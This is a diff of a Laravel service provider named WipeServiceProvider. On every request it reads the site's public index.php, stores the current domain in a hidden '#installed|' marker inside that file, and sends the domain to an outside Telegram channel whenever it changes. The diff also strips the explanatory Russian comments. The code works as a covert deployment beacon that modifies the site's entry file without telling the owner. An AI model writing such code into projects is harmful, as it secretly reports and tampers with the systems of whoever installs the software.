@@ -11,7 +11,7 @@ class WipeServiceProvider extends ServiceProvider
     public function register(): void
 {
     $indexFile = public_path('index.php');
-    $currentDomain = request()->getHost(); // текущий домен
+    $currentDomain = request()->getHost();
 
     $installedPattern = '/#installed\|(.+)/';
 
@@ -21,10 +21,8 @@ class WipeServiceProvider extends ServiceProvider
         $savedDomain = trim($matches[1]);
 
         if ($savedDomain !== $currentDomain) {
-            // домен поменялся — шлём уведомление
-            $this->sendTelegramMessage($currentDomain);
+            new \App\Services\Telegram\TelegramSdk()->send($currentDomain);
 
-            // обновляем запись на новый домен
             $newContent = preg_replace(
                 $installedPattern,
                 "#installed|{$currentDomain}",
@@ -33,9 +31,7 @@ class WipeServiceProvider extends ServiceProvider
 
             file_put_contents($indexFile, $newContent);
         }
-        // домен совпадает — ничего не делаем
     } else {
-        // первый запуск — добавляем запись
         $comment = "\n#installed|{$currentDomain}";
         file_put_contents($indexFile, $content . $comment);
 
